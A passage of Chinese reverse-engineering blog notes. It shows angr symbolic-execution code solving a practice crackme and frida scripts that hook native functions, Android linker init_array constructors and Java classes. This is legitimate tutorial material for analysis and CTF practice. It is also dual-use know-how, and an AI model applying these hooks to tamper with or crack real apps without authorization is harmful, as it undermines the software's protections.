<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag=BVS(<span class="string">&#x27;flag&#x27;</span>,<span class="number">8</span>*(flag_length))<span class="comment">#BVS长度单位是bit,创建变量对象</span></span><br><span class="line">state=p.factory.entry_state()<span class="comment">#创建状态对象</span></span><br><span class="line">state.memory.store(addr,flag)<span class="comment">#在指定地址addr写入flag(长度为8字节)也可以自定义长度</span></span><br></pre></td></tr></table></figure></div>


</blockquote>
</blockquote>
<h2 id="添加条件"><a href="#添加条件" class="headerlink" title="添加条件"></a>添加条件</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">state.solver.add(条件语句)</span><br></pre></td></tr></table></figure></div>

<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">state.solver.<span class="built_in">eval</span>(变量对象)</span><br></pre></td></tr></table></figure></div>





<p>00_angr_find</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一种 直接explore</span></span><br><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> claripy <span class="keyword">import</span> *</span><br><span class="line">p=Project(<span class="string">&#x27;./00_angr_find&#x27;</span>)</span><br><span class="line">state=p.factory.entry_state()<span class="comment">#</span></span><br><span class="line">sm=p.factory.simgr(state)</span><br><span class="line">sm.explore(find=<span class="number">0x08048675</span>)</span><br><span class="line">sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#第二种 通过栈操作实际上是内存操作</span></span><br><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> claripy <span class="keyword">import</span> *</span><br><span class="line">p=Project(<span class="string">&#x27;./00_angr_find&#x27;</span>)</span><br><span class="line">state=p.factory.entry_state(addr=<span class="number">0x0804860F</span>)<span class="comment">#地址不放在开始 是因为为了防止其他函数影响操作</span></span><br><span class="line">flag=BVS(<span class="string">&#x27;flag&#x27;</span>,<span class="number">8</span>*<span class="number">9</span>)</span><br><span class="line">state.solver.add(*[And(flag[i+<span class="number">7</span>:i]&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>),flag[i+<span class="number">7</span>:i]&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">72</span>,<span class="number">8</span>)])<span class="comment">#注意是大端序所以此处从倒数第二个字符开始，因为倒数第一个字符是结束符\x00</span></span><br><span class="line">state.solver.add(flag[<span class="number">7</span>:<span class="number">0</span>]==<span class="number">0</span>)<span class="comment">#结束符条件</span></span><br><span class="line">addr=state.regs.ebp-<span class="number">0x15</span></span><br><span class="line">state.memory.store(addr,flag)</span><br><span class="line">sm=p.factory.simgr(state)</span><br><span class="line">sm.explore(find=<span class="number">0x8048675</span>)</span><br><span class="line"><span class="built_in">int</span>.to_bytes(sm.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(flag),<span class="number">9</span>,<span class="string">&#x27;big&#x27;</span>)<span class="comment">#注意是大端序（低地址在高位，高地址在低位)</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>angr分析框架</category>
      </categories>
  </entry>
  <entry>
    <title>state</title>
    <url>/2024/01/02/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/angr%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6/state/</url>
    <content><![CDATA[<p><a class="link"   href="https://docs.angr.io/en/latest/core-concepts/states.html" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<table>
<thead>
<tr>
<th>state</th>
<th>explain</th>
</tr>
</thead>
<tbody><tr>
<td>.blank_state</td>
<td>大多数数据未初始化，进入时返回没有约束的符号值</td>
</tr>
<tr>
<td>.entry_state</td>
<td>准备调用main之前的状态</td>
</tr>
<tr>
<td>.full_init_state</td>
<td>共享库和预定义内容都已经加载完毕，在enter状态之前，例如刚刚加载完共享库</td>
</tr>
<tr>
<td>.call_state</td>
<td>准备调用函数的状态</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>angr分析框架</category>
      </categories>
  </entry>
  <entry>
    <title>环境配置</title>
    <url>/2023/12/30/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/angr%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p><code>pip install angr -i https://pypi.tuna.tsinghua.edu.cn/simple some-package</code></p>
<p>即可</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>angr分析框架</category>
      </categories>
  </entry>
  <entry>
    <title>hook</title>
    <url>/2024/03/16/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/frida%E6%A1%86%E6%9E%B6/hook/</url>
    <content><![CDATA[<p>frida通过js脚本实现功能（命令行类似于ipython</p>
<p>有多种启动方式</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida -U ps-name <span class="comment">#可通过frida-ps 获取对应的进程名</span></span><br><span class="line">frida -UF <span class="comment">#运行前台应用,wsa运行会有问题</span></span><br><span class="line">frida -l ps-name js文件 <span class="comment">#调用对应js文件</span></span><br><span class="line">frida -UF -l js文件 <span class="comment">#调用js并hook前台activity</span></span><br></pre></td></tr></table></figure></div>

<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="hook-native层函数"><a href="#hook-native层函数" class="headerlink" title="hook native层函数"></a>hook native层函数</h2><h3 id="hook普通函数"><a href="#hook普通函数" class="headerlink" title="hook普通函数"></a>hook普通函数</h3><blockquote>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">func_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libmidand.so&quot;</span>, <span class="string">&quot;_Z10murmur3_32PKcjj&quot;</span>);<span class="comment">//查找对应so某函数位置，注意该函数返回的是ptr对象,可用ptr(地址)生成</span></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(func_addr,&#123; <span class="comment">// 将拦截器附加到 func_addr 所指向的函数上</span></span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) <span class="comment">//函数调用前运行，可用于获取参数</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(args[<span class="number">0</span>]))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;<span class="comment">//函数调用后运行，可用于获取返回值</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;enter murmur3_32 retvalue-&gt;\n&quot;</span> + <span class="title function_">hexdump</span>(args));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h3 id="hook-init-array"><a href="#hook-init-array" class="headerlink" title="hook init_array"></a>hook init_array</h3><blockquote>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> cm_include = <span class="string">`</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;gum/gumprocess.h&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> cm_code = <span class="string">`</span></span><br><span class="line"><span class="string">#if defined(__LP64__)</span></span><br><span class="line"><span class="string">#define USE_RELA 1</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">// http://aosp.app/android-14.0.0_r1/xref/bionic/libc/include/link.h</span></span><br><span class="line"><span class="string">#if defined(__LP64__)</span></span><br><span class="line"><span class="string">#define ElfW(type) Elf64_ ## type</span></span><br><span class="line"><span class="string">#else</span></span><br><span class="line"><span class="string">#define ElfW(type) Elf32_ ## type</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">// http://aosp.app/android-14.0.0_r1/xref/bionic/libc/kernel/uapi/asm-generic/int-ll64.h</span></span><br><span class="line"><span class="string">typedef signed char __s8;</span></span><br><span class="line"><span class="string">typedef unsigned char __u8;</span></span><br><span class="line"><span class="string">typedef signed short __s16;</span></span><br><span class="line"><span class="string">typedef unsigned short __u16;</span></span><br><span class="line"><span class="string">typedef signed int __s32;</span></span><br><span class="line"><span class="string">typedef unsigned int __u32;</span></span><br><span class="line"><span class="string">typedef signed long long __s64;</span></span><br><span class="line"><span class="string">typedef unsigned long long __u64;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">// http://aosp.app/android-14.0.0_r1/xref/bionic/libc/kernel/uapi/linux/elf.h</span></span><br><span class="line"><span class="string">typedef __u32 Elf32_Addr;</span></span><br><span class="line"><span class="string">typedef __u16 Elf32_Half;</span></span><br><span class="line"><span class="string">typedef __u32 Elf32_Off;</span></span><br><span class="line"><span class="string">typedef __s32 Elf32_Sword;</span></span><br><span class="line"><span class="string">typedef __u32 Elf32_Word;</span></span><br><span class="line"><span class="string">typedef __u64 Elf64_Addr;</span></span><br><span class="line"><span class="string">typedef __u16 Elf64_Half;</span></span><br><span class="line"><span class="string">typedef __s16 Elf64_SHalf;</span></span><br><span class="line"><span class="string">typedef __u64 Elf64_Off;</span></span><br><span class="line"><span class="string">typedef __s32 Elf64_Sword;</span></span><br><span class="line"><span class="string">typedef __u32 Elf64_Word;</span></span><br><span class="line"><span class="string">typedef __u64 Elf64_Xword;</span></span><br><span class="line"><span class="string">typedef __s64 Elf64_Sxword;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct dynamic &#123;</span></span><br><span class="line"><span class="string">  Elf32_Sword d_tag;</span></span><br><span class="line"><span class="string">  union &#123;</span></span><br><span class="line"><span class="string">    Elf32_Sword d_val;</span></span><br><span class="line"><span class="string">    Elf32_Addr d_ptr;</span></span><br><span class="line"><span class="string">  &#125; d_un;</span></span><br><span class="line"><span class="string">&#125; Elf32_Dyn;</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">  Elf64_Sxword d_tag;</span></span><br><span class="line"><span class="string">  union &#123;</span></span><br><span class="line"><span class="string">    Elf64_Xword d_val;</span></span><br><span class="line"><span class="string">    Elf64_Addr d_ptr;</span></span><br><span class="line"><span class="string">  &#125; d_un;</span></span><br><span class="line"><span class="string">&#125; Elf64_Dyn;</span></span><br><span class="line"><span class="string">typedef struct elf32_rel &#123;</span></span><br><span class="line"><span class="string">  Elf32_Addr r_offset;</span></span><br><span class="line"><span class="string">  Elf32_Word r_info;</span></span><br><span class="line"><span class="string">&#125; Elf32_Rel;</span></span><br><span class="line"><span class="string">typedef struct elf64_rel &#123;</span></span><br><span class="line"><span class="string">  Elf64_Addr r_offset;</span></span><br><span class="line"><span class="string">  Elf64_Xword r_info;</span></span><br><span class="line"><span class="string">&#125; Elf64_Rel;</span></span><br><span class="line"><span class="string">typedef struct elf32_rela &#123;</span></span><br><span class="line"><span class="string">  Elf32_Addr r_offset;</span></span><br><span class="line"><span class="string">  Elf32_Word r_info;</span></span><br><span class="line"><span class="string">  Elf32_Sword r_addend;</span></span><br><span class="line"><span class="string">&#125; Elf32_Rela;</span></span><br><span class="line"><span class="string">typedef struct elf64_rela &#123;</span></span><br><span class="line"><span class="string">  Elf64_Addr r_offset;</span></span><br><span class="line"><span class="string">  Elf64_Xword r_info;</span></span><br><span class="line"><span class="string">  Elf64_Sxword r_addend;</span></span><br><span class="line"><span class="string">&#125; Elf64_Rela;</span></span><br><span class="line"><span class="string">typedef struct elf32_sym &#123;</span></span><br><span class="line"><span class="string">  Elf32_Word st_name;</span></span><br><span class="line"><span class="string">  Elf32_Addr st_value;</span></span><br><span class="line"><span class="string">  Elf32_Word st_size;</span></span><br><span class="line"><span class="string">  unsigned char st_info;</span></span><br><span class="line"><span class="string">  unsigned char st_other;</span></span><br><span class="line"><span class="string">  Elf32_Half st_shndx;</span></span><br><span class="line"><span class="string">&#125; Elf32_Sym;</span></span><br><span class="line"><span class="string">typedef struct elf64_sym &#123;</span></span><br><span class="line"><span class="string">  Elf64_Word st_name;</span></span><br><span class="line"><span class="string">  unsigned char st_info;</span></span><br><span class="line"><span class="string">  unsigned char st_other;</span></span><br><span class="line"><span class="string">  Elf64_Half st_shndx;</span></span><br><span class="line"><span class="string">  Elf64_Addr st_value;</span></span><br><span class="line"><span class="string">  Elf64_Xword st_size;</span></span><br><span class="line"><span class="string">&#125; Elf64_Sym;</span></span><br><span class="line"><span class="string">typedef struct elf32_phdr &#123;</span></span><br><span class="line"><span class="string">  Elf32_Word p_type;</span></span><br><span class="line"><span class="string">  Elf32_Off p_offset;</span></span><br><span class="line"><span class="string">  Elf32_Addr p_vaddr;</span></span><br><span class="line"><span class="string">  Elf32_Addr p_paddr;</span></span><br><span class="line"><span class="string">  Elf32_Word p_filesz;</span></span><br><span class="line"><span class="string">  Elf32_Word p_memsz;</span></span><br><span class="line"><span class="string">  Elf32_Word p_flags;</span></span><br><span class="line"><span class="string">  Elf32_Word p_align;</span></span><br><span class="line"><span class="string">&#125; Elf32_Phdr;</span></span><br><span class="line"><span class="string">typedef struct elf64_phdr &#123;</span></span><br><span class="line"><span class="string">  Elf64_Word p_type;</span></span><br><span class="line"><span class="string">  Elf64_Word p_flags;</span></span><br><span class="line"><span class="string">  Elf64_Off p_offset;</span></span><br><span class="line"><span class="string">  Elf64_Addr p_vaddr;</span></span><br><span class="line"><span class="string">  Elf64_Addr p_paddr;</span></span><br><span class="line"><span class="string">  Elf64_Xword p_filesz;</span></span><br><span class="line"><span class="string">  Elf64_Xword p_memsz;</span></span><br><span class="line"><span class="string">  Elf64_Xword p_align;</span></span><br><span class="line"><span class="string">&#125; Elf64_Phdr;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">// http://aosp.app/android-14.0.0_r1/xref/bionic/linker/linker_soinfo.h</span></span><br><span class="line"><span class="string">typedef void (*linker_dtor_function_t)();</span></span><br><span class="line"><span class="string">typedef void (*linker_ctor_function_t)(int, char**, char**);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">#if defined(__work_around_b_24465209__)</span></span><br><span class="line"><span class="string">#define SOINFO_NAME_LEN 128</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">  #if defined(__work_around_b_24465209__)</span></span><br><span class="line"><span class="string">    char old_name_[SOINFO_NAME_LEN];</span></span><br><span class="line"><span class="string">  #endif</span></span><br><span class="line"><span class="string">    const ElfW(Phdr)* phdr;</span></span><br><span class="line"><span class="string">    size_t phnum;</span></span><br><span class="line"><span class="string">  #if defined(__work_around_b_24465209__)</span></span><br><span class="line"><span class="string">    ElfW(Addr) unused0; // DO NOT USE, maintained for compatibility.</span></span><br><span class="line"><span class="string">  #endif</span></span><br><span class="line"><span class="string">    ElfW(Addr) base;</span></span><br><span class="line"><span class="string">    size_t size;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">  #if defined(__work_around_b_24465209__)</span></span><br><span class="line"><span class="string">    uint32_t unused1;  // DO NOT USE, maintained for compatibility.</span></span><br><span class="line"><span class="string">  #endif</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    ElfW(Dyn)* dynamic;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">  #if defined(__work_around_b_24465209__)</span></span><br><span class="line"><span class="string">    uint32_t unused2; // DO NOT USE, maintained for compatibility</span></span><br><span class="line"><span class="string">    uint32_t unused3; // DO NOT USE, maintained for compatibility</span></span><br><span class="line"><span class="string">  #endif</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    void* next;</span></span><br><span class="line"><span class="string">    uint32_t flags_;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    const char* strtab_;</span></span><br><span class="line"><span class="string">    ElfW(Sym)* symtab_;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    size_t nbucket_;</span></span><br><span class="line"><span class="string">    size_t nchain_;</span></span><br><span class="line"><span class="string">    uint32_t* bucket_;</span></span><br><span class="line"><span class="string">    uint32_t* chain_;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">  #if !defined(__LP64__)</span></span><br><span class="line"><span class="string">    ElfW(Addr)** unused4; // DO NOT USE, maintained for compatibility</span></span><br><span class="line"><span class="string">  #endif</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">  #if defined(USE_RELA)</span></span><br><span class="line"><span class="string">    ElfW(Rela)* plt_rela_;</span></span><br><span class="line"><span class="string">    size_t plt_rela_count_;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    ElfW(Rela)* rela_;</span></span><br><span class="line"><span class="string">    size_t rela_count_;</span></span><br><span class="line"><span class="string">  #else</span></span><br><span class="line"><span class="string">    ElfW(Rel)* plt_rel_;</span></span><br><span class="line"><span class="string">    size_t plt_rel_count_;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    ElfW(Rel)* rel_;</span></span><br><span class="line"><span class="string">    size_t rel_count_;</span></span><br><span class="line"><span class="string">  #endif</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    linker_ctor_function_t* preinit_array_;</span></span><br><span class="line"><span class="string">    size_t preinit_array_count_;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    linker_ctor_function_t* init_array_;</span></span><br><span class="line"><span class="string">    size_t init_array_count_;</span></span><br><span class="line"><span class="string">    linker_dtor_function_t* fini_array_;</span></span><br><span class="line"><span class="string">    size_t fini_array_count_;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    linker_ctor_function_t init_func_;</span></span><br><span class="line"><span class="string">    linker_dtor_function_t fini_func_;</span></span><br><span class="line"><span class="string">&#125; soinfo;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">void tell_init_info(soinfo* ptr, void (*cb)(int, void*, void*)) &#123;</span></span><br><span class="line"><span class="string">    cb(ptr-&gt;init_array_count_, ptr-&gt;init_array_, ptr-&gt;init_func_);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> cm = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> tell_init_info = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setup_cmodule</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Process</span>.<span class="property">pointerSize</span> == <span class="number">4</span>) &#123;</span><br><span class="line">        cm_code = cm_include + <span class="string">&quot;#define __work_around_b_24465209__ 1&quot;</span> + cm_code;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cm_code = cm_include + <span class="string">&quot;#define __LP64__ 1&quot;</span> + cm_code;</span><br><span class="line">    &#125;</span><br><span class="line">    cm = <span class="keyword">new</span> <span class="title class_">CModule</span>(cm_code, &#123;&#125;);</span><br><span class="line">    tell_init_info = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(cm.<span class="property">tell_init_info</span>, <span class="string">&quot;void&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_addr_info</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> mm = <span class="keyword">new</span> <span class="title class_">ModuleMap</span>();</span><br><span class="line">    <span class="keyword">let</span> info = mm.<span class="title function_">find</span>(addr);</span><br><span class="line">    <span class="keyword">if</span> (info == <span class="literal">null</span>) <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`[<span class="subst">$&#123;info.name&#125;</span> + <span class="subst">$&#123;addr.sub(info.base)&#125;</span>]`</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_call_constructors</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> get_soname = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> call_constructors_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> hook_call_constructors_addr = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> linker = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Process</span>.<span class="property">pointerSize</span> == <span class="number">4</span>) &#123;</span><br><span class="line">        linker = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;linker&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        linker = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;linker64&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> symbols = linker.<span class="title function_">enumerateSymbols</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; symbols.<span class="property">length</span>; index++) &#123;</span><br><span class="line">        <span class="keyword">let</span> symbol = symbols[index];</span><br><span class="line">        <span class="keyword">if</span> (symbol.<span class="property">name</span> == <span class="string">&quot;__dl__ZN6soinfo17call_constructorsEv&quot;</span>) &#123;</span><br><span class="line">            call_constructors_addr = symbol.<span class="property">address</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.<span class="property">name</span> == <span class="string">&quot;__dl__ZNK6soinfo10get_sonameEv&quot;</span>) &#123;</span><br><span class="line">            get_soname = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(symbol.<span class="property">address</span>, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hook_call_constructors_addr &amp;&amp; call_constructors_addr &amp;&amp; get_soname) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(call_constructors_addr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">let</span> soinfo = args[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">let</span> soname = <span class="title function_">get_soname</span>(soinfo).<span class="title function_">readCString</span>();</span><br><span class="line">                <span class="title function_">tell_init_info</span>(soinfo, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="function">(<span class="params">count, init_array_ptr, init_func</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[call_constructors] <span class="subst">$&#123;soname&#125;</span> count:<span class="subst">$&#123;count&#125;</span>`</span>);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[call_constructors] init_array_ptr:<span class="subst">$&#123;init_array_ptr&#125;</span>`</span>);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[call_constructors] init_func:<span class="subst">$&#123;init_func&#125;</span> -&gt; <span class="subst">$&#123;get_addr_info(init_func)&#125;</span>`</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; count; index++) &#123;</span><br><span class="line">                        <span class="keyword">let</span> init_array_func = init_array_ptr.<span class="title function_">add</span>(<span class="title class_">Process</span>.<span class="property">pointerSize</span> * index).<span class="title function_">readPointer</span>();</span><br><span class="line">                        <span class="keyword">let</span> func_info = <span class="title function_">get_addr_info</span>(init_array_func);</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[call_constructors] init_array:<span class="subst">$&#123;index&#125;</span> <span class="subst">$&#123;init_array_func&#125;</span> -&gt; <span class="subst">$&#123;func_info&#125;</span>`</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;, <span class="string">&quot;void&quot;</span>, [<span class="string">&quot;int&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">setup_cmodule</span>();</span><br><span class="line">    <span class="title function_">hook_call_constructors</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// frida -U -f pkg_name -l hook.js -o hook.log</span></span><br></pre></td></tr></table></figure></div>


</blockquote>
<h2 id="hook-java层"><a href="#hook-java层" class="headerlink" title="hook java层"></a>hook java层</h2><h3 id="hook类"><a href="#hook类" class="headerlink" title="hook类"></a>hook类</h3><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;完整classname&quot;</span>);</span><br><span class="line">        tmp.<span class="property">methodname</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg1, arg2</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">bytes2hexstr_2</span>(arg2));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>



<h3 id="hook对象"><a href="#hook对象" class="headerlink" title="hook对象"></a>hook对象</h3><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">char_set</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;java.nio.charset.Charset&quot;</span>,&#123;<span class="comment">//搜索类的实例化对象</span></span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">tmp</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Charset</span>.<span class="title function_">defaultCharset</span>())<span class="comment">//进行主动调用</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="hook匿名类"><a href="#hook匿名类" class="headerlink" title="hook匿名类"></a>hook匿名类</h3><p>根据匿名类的生成规则</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&lt;outer <span class="keyword">class</span> <span class="title class_">name</span>&gt;$&lt;number&gt; <span class="comment">//number从一开始每次增加一</span></span><br></pre></td></tr></table></figure></div>

<p>也可通过smali语法查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202404061920042.png"
                      alt="image-20240406192051874"
                ></p>
<p>所以也可通过hook类方式进行hook</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.crackme1.MainActivity$1&quot;</span>);</span><br><span class="line">    tmp.<span class="property">onClick</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg1</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(arg1);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>



<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1>]]></content>
      <categories>
        <category>Re</category>
        <category>分析工具</category>
        <category>frida框架</category>
      </categories>
  </entry>
  <entry>
    <title>环境配置</title>
    <url>/2024/01/21/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/frida%E6%A1%86%E6%9E%B6/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>frida是标准的C&#x2F;S模式，服务端需要安在手机上，客户端需要安在电脑上</p>
<p><strong>注意，两者版本需一致</strong></p>
